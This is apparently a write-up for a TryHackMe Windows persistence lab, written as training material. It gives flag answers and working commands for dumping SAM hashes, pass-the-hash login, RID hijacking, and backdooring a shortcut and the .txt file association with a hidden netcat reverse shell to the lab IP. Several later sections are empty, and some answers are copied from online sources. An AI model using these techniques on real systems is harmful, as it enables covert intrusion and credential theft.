![Windows Local Persistence Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Cover.png" alt="Windows Local Persistence Logo">
</p>

# Windows Local Persistence

This guide contains the answer and steps necessary to get to them for the [Windows Local Persistence](https://tryhackme.com/r/room/windowslocalpersistence) room.

## Table of contents

- [Tampering With Unprivileged Accounts](#tampering-with-unprivileged-accounts)
- [Backdooring Files](#backdooring-files)
- [Abusing Services](#abusing-services)
- [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
- [Logon Triggered Persistence](#logon-triggered-persistence)
- [Backdooring the Login Screen / RDP](#backdooring-the-login-screen-/-rdp)
- [Persisting Through Existing Services](#persisting-through-existing-services)

### Tampering With Unprivileged Accounts

1. Insert flag1 here

   The first thing we need to do, is add the thmuser1 to the "Backup Operators" and the "Remote Management Users" groups. This can be done through the Administrator account.

   ```console
   net localgroup "Backup Operators" thmuser1 /add
   
   net localgroup "Remote Management Users" thmuser1 /add
   ```

   ![Tampering Add User](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Add_User.png)

   We also need to disable the LocalAccountTokenFilterPolicy.

   ```console
   reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
   ```

   ![Tampering Change Policy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Change_Policy.png)

   Now we have access to the SAM and SYSTEM files. Lets export them from the registry and download them to our machine.

   ```console
   reg save hklm\system system.bak
   reg save hklm\sam sam.bak

   download system.bak
   download sam.bak
   ```

   ![Tampering Download](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Download.png)

   After downloading, we can use the `secretsdump.py` file to dump the hashes from the hives.

   ```console
   python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
   ```

   With the found Administrator hash (only the last part), we can use a pass-the-hash method to login withn WinRM.

   ```console
   evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
   ```

   Success! Now we can execute the flag file.

   ![Tampering Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag1.png)

   ><details><summary>Click for answer</summary>THM{FLAG_BACKED_UP!}</details>

2. Insert flag2 here

   First, we add the required privileges (SeBackupPrivilege and SeRestorePrivilege) to the account through the Administrator account.

   ```console
   secedit /export /cfg config.ini
   ```

   ![Tampering Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Config.png)

   Now we must load this configuration back into the system.

   ```console
   secedit /import /cfg config.ini /db config.db
   secedit /configure /db config.db /cfg config.ini
   ```

   Lastly, we change the descriptor for WinRM so the user can use it. Add the user (thmuser2) and make sure it has full control.

   ```console
   Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
   ```

   ![Tampering Descriptor](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Descriptor.png)

   After having done that, we can login with this user and export and dump the hashes from the accounts as done in the previous question.

   Now login with the obtained Administrator hash and find our second flag.
   
   ![Tampering Flag2 Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag2_Error.png)

   Unfortunately, there seems to be something missing. But the privileges are enabled for my account...

   ![Tampering Flag2 Error 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Tampering_Flag2_Error_2.png)

   We'll have to get back on this one.

   ><details><summary>Click for answer</summary>Answer found online is: THM{IM_JUST_A_NORMAL_USER}</details>

3. Insert flag3 here

   First we need to open regedit with SYSTEM privileges. We will use `PsExec` for this.

   ```cmd
   PsExec.exe -i -s regedit
   ```

   ![Rid Regedit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Regedit.png)

   Here we see a list of users. We are interested in `thmuser3`. So we need to find the correct one. 

   Using `wmic` we can find the RIDs of all users.

   ```cmd
   wmic useraccount get name,sid
   ```

   ![Rid Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Users.png)

   `thmuser3` has RID 1010. Converting this into its hex value (base16) gives us `3f2`. 
   
   ![Rid Hex Value](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Hex_Value.png)
   
   This can also be found in regedit under the users tab.

   ![Rid Regedit User Hex](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Regedit_User_Hex.png)

   Under the F key, we can see the RID data for this user. At position 30 (0x30) we can see the RID stored with little endian notation (e.g., f2 03).

   ![Rid Old Value](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_Old_Value.png)

   We must change this to that of the Administrators account which is 1F4 (this can be found under the users tab in regedit). Remember to reverse the numbers (f4 01).

   ![Rid New Value](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Rid_New_Value.png)

   Unfortunately, the machine seems to have crashed. So I had to restart the machine and re-do these steps.
   
   After trying again, it still won't work...
   
   #
   Now we can log into the machine with RDP and the `thmuser3` credentials. 

   RID LOGIN THMUSER3

   It appears we have indeed Admin privileges as our terminal is started in system32. Lets try and get our flag.

   RID FLAG 3
   #

   ><details><summary>Click for answer</summary>Answer found online is: THM{TRUST_ME_IM_AN_ADMIN}</details>

### Backdooring Files

1. Insert flag5 here

   Lets first create a Powershell script which will create a reverse shell and afterwards opens calculator as if nothing happened.

   ![Backdoor Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Script.png)

   Don't forget to add your IP and port. Save it to the same folder as the calc shortcut (system32).

   Now we must alter the shortcut to link to our script. The target should be:

   ```console
   powershell.exe -WindowStyle hidden C:\Windows\system32\backdoor.ps1
   ```

   ![Backdoor Shortcut](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Shortcut.png)

   Notice that the shortcut icon has changed to a powershell icon. Lets revert this to avoid suspicion.

   ![Backdoor Shortcut Icon](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Shortcut_Icon.png)

   Now we can start out listener with: `nc -nlvp 1337` and execute the shortcut. If we get a connection we can retrieve our flag.

   ![Backdoor Flag5](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Flag5)

   ><details><summary>Click for answer</summary>THM{NO_SHORTCUTS_IN_LIFE}
</details>

2. Insert flag6 here

   For this we need a script which is slightly different.

   ```powershell
   Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.18.78.136 1337"
   C:\Windows\system32\NOTEPAD.EXE $args[0]
   ```
   
   ![Backdoor Script2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Script2.png)

   Now we must change the file type association of a .txt file.

   We must change the open command for `txtfile` to the following:

   ```powershell
   powershell -windowstyle hidden C:\Windows\backdoor2.ps1 %1
   ```

   ![Backdoor Txtfile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Txtfile.png)

   Next we create a text file on the desktop and setup our listener on our machine with `nc -nlvp 1337`. Finally, we should get a connection when opening the text file.

   ![Backdoor Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Reverse_Shell.png)

   All thats left to do now, is get our flag.

   ![Backdoor Flag6](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Backdoor_Flag6.png)

   ><details><summary>Click for answer</summary>THM{TXT_FILES_WOULD_NEVER_HURT_YOU}</details>

### Abusing Services

1. Insert flag7 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag8 here



   ><details><summary>Click for answer</summary></details>

### Abusing Scheduled Tasks

1. Insert flag9 here



   ><details><summary>Click for answer</summary></details>

### Logon Triggered Persistence

1. Insert flag10 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag11 here



   ><details><summary>Click for answer</summary></details>

3. Insert flag12 here



   ><details><summary>Click for answer</summary></details>

4. Insert flag13 here



   ><details><summary>Click for answer</summary></details>

### Backdooring the Login Screen / RDP

1. Insert flag14 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag15 here



   ><details><summary>Click for answer</summary></details>

### Persisting Through Existing Services

1. Insert flag16 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag17 here



   ><details><summary>Click for answer</summary></details>

